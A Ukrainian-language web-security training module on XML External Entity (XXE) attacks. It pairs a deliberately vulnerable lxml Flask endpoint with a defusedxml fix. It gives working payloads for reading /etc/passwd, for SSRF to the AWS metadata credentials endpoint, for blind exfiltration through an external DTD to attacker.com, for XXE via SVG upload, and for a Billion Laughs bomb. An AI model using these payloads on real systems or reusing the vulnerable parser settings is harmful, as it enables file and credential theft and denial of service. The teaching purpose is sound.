Модуль 15 — XML External Entity (XXE)

Дізнайся, як XML-парсери можуть бути використані для читання файлів, виконання SSRF та ексфільтрації даних через розширення сутностей.

Стародавня фіча, сучасна вразливість

XML був розроблений наприкінці 1990-х, і його творці вбудували потужну функцію — зовнішні сутності (external entities) — спосіб для XML-документа включати вміст із зовнішніх файлів або URL. На той час це здавалося чудовою ідеєю. Можна було визначити текстовий блок для повторного використання і посилатися на нього по всьому документу, або підтягувати дані з іншого файлу.

Проблема в тому, що "включити вміст із файлу" означає будь-який файл на сервері. А "включити вміст за URL" означає, що сервер зробить HTTP-запит на будь-яку URL, яку ти вкажеш. Коли додаток парсить надісланий користувачем XML із увімкненими зовнішніми сутностями, атакуючий може читати довільні файли з сервера, змушувати сервер з'єднуватися з внутрішніми сервісами (SSRF) та ексфільтрувати дані на свій сервер.

XXE — це одна з тих вразливостей, яка дивує людей, бо небезпечна поведінка — це не баг, а фіча специфікації XML. XML-парсер робить саме те, для чого він був створений. Вразливість полягає в тому, що ніхто не повинен використовувати цю фічу з ненадійним вводом.

XML-сутності та DTD — основи

Перед тим як експлуатувати XXE, тобі потрібно зрозуміти, як працюють XML-сутності. Document Type Definition (DTD) може визначати сутності — іменовані посилання, які розгортаються у значення під час парсингу XML. Думай про них як про змінні у мові програмування.

ТипСинтаксисЩо робить
Internal entity<!ENTITY name "value">Розгортається у визначений рядок
External entity (file)<!ENTITY name SYSTEM "file:///etc/passwd">Читає вміст локального файлу
External entity (URL)<!ENTITY name SYSTEM "http://internal:8080/">Робить HTTP-запит і включає відповідь
Parameter entity<!ENTITY % name SYSTEM "url">Використовується всередині самого DTD (для blind/OOB XXE)

Базова XXE — читання файлів

Найпростіша XXE-атака визначає зовнішню сутність, яка читає локальний файл, а потім посилається на цю сутність у тілі XML, щоб вміст файлу з'явився у відповіді сервера: 

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

Коли сервер парсить цей XML, він натрапляє на &xxe; і замінює його вмістом /etc/passwd. Якщо додаток відображає або повертає розпарсений вміст XML, атакуючий бачить файл прямо у відповіді.

Vulnerable Code

from lxml import etree

@app.route('/parse', methods=['POST'])
def parse():
    xml_data = request.data
    # DANGEROUS: resolves external entities by default
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    doc = etree.fromstring(xml_data, parser)
    return etree.tostring(doc, pretty_print=True)

Safe Code

import defusedxml.ElementTree as ET

@app.route('/parse', methods=['POST'])
def parse():
    xml_data = request.data
    # SAFE: defusedxml blocks DTDs, external entities, and entity expansion
    doc = ET.fromstring(xml_data)
    return ET.tostring(doc)
defusedxml: Python-бібліотека defusedxml — це drop-in заміна стандартних XML-бібліотек, яка за замовчуванням вимикає всі небезпечні XML-функції. Якщо ти парсиш XML у Python, завжди використовуй defusedxml. Вона блокує зовнішні сутності, обробку DTD та бомби розширення сутностей.

XXE для SSRF

Зовнішні сутності не лише читають файли — вони також можуть робити HTTP-запити. Це перетворює XXE на вектор Server-Side Request Forgery (SSRF): 

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>

Цей пейлоад змушує сервер звернутися до ендпоінта метаданих AWS — який доступний тільки зсередини мережі AWS. Якщо додаток працює на EC2, атакуючий отримує IAM-креденшали інстансу. Це той самий вектор SSRF-атаки, який був використаний у зломі Capital One у 2019 році (хоча в тому конкретному випадку використовувався інший вектор SSRF, не XXE).

Blind XXE — коли ти не бачиш вивід

Що робити, якщо додаток парсить твій XML, але не повертає значення сутностей у відповіді? Потрібно ексфільтрувати дані out-of-band. Для цього використовуються parameter entities — сутності, які використовуються всередині самого DTD і можуть ініціювати HTTP-запити з викраденими даними: 

<!-- Step 1: Host this DTD file on your server (evil.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
<!-- Step 2: Send this XML to the target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>test</data>

Сервер завантажує твій зовнішній DTD, який читає локальний файл і потім робить HTTP-запит на твій сервер із вмістом файлу в URL. Ти бачиш дані в логах свого сервера. Складно? Так. Але це надійно працює проти багатьох XML-парсерів.

XXE через завантаження файлів

XXE виникає не лише в очевидних XML API-ендпоінтах. Багато форматів файлів під капотом є XML:

  • SVG-зображення — векторна графіка на основі XML. Завантаж SVG із XXE-пейлоадами.
  • DOCX/XLSX/PPTX — файли Microsoft Office — це ZIP-архіви, що містять XML-файли. Зміни внутрішній XML, щоб включити сутності.
  • SOAP-запити — SOAP API використовують XML для всієї комунікації.
  • RSS/Atom-стрічки — формати синдикації на основі XML.
  • SAML assertions — токени автентифікації на основі XML, які використовуються в SSO.
<!-- XXE via SVG upload -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
Порада: Тестуючи функції завантаження файлів, завжди спробуй завантажити SVG із XXE-пейлоадами. Багато бібліотек обробки зображень парсять SVG як XML і є вразливими. Навіть якщо додаток приймає лише PNG/JPG, спробуй змінити Content-Type на image/svg+xml і подивись, чи сервер обробить його.

Атака Billion Laughs (XML Bomb)

Пов'язана XML-атака — це denial-of-service атака "Billion Laughs", яка використовує вкладене розширення сутностей для споживання величезних обсягів пам'яті: 

<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... repeat 7 more times ... -->
]>
<data>&lol9;</data>

Кожен рівень множить на 10, тому &lol9; розгортається у 10^9 (один мільярд) копій "lol" — споживаючи гігабайти пам'яті та крашуючи парсер. Саме тому defusedxml також обмежує глибину розширення сутностей.

Вплив: XXE може читати локальні файли (вихідний код, конфігурацію, креденшали), виконувати SSRF до внутрішніх сервісів (хмарні метадані, бази даних, адмінпанелі), ексфільтрувати дані out-of-band, спричиняти denial of service через розширення сутностей, а в рідкісних випадках — досягати RCE (через PHP-обгортку expect:// або виконання процесів у .NET).
